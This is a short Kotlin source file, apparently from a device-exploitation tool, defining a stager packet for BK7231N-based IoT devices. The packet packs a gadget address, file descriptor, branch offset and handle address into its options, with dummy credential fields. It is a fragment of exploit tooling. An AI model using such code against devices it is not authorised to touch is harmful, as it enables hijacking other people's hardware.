/*
 * Copyright (c) Kuba Szczodrzyński 2022-10-31.
 */

package io.github.cloudcutter.work.protocol.stager.bk7231n

import io.github.cloudcutter.data.model.ProfileLightleakDataN
import io.github.cloudcutter.work.protocol.base.BasePacket
import java.nio.ByteBuffer
import java.nio.ByteOrder

abstract class StagerPacket(
	private val profile: ProfileLightleakDataN,
) : BasePacket() {

	var fd = 3
	abstract val target: ProfileLightleakDataN.Gadget

	override fun getJsonFields() = mapOf(
		"ssid" to "1".toByteArray(),
		"passwd" to "1".toByteArray(),
		"token" to "1".toByteArray(),
	)

	// default to empty command data
	override fun getCommand() = byteArrayOf()

	override fun getOptions(): ByteArray? {
		val buf = ByteBuffer.allocate(16).order(ByteOrder.LITTLE_ENDIAN)
		buf.putInt(target.address)
		buf.putInt(fd)
		buf.putInt(target.branchOffset ?: 0)
		buf.putInt(profile.addressMap.handle)
		return buf.array()
	}
}
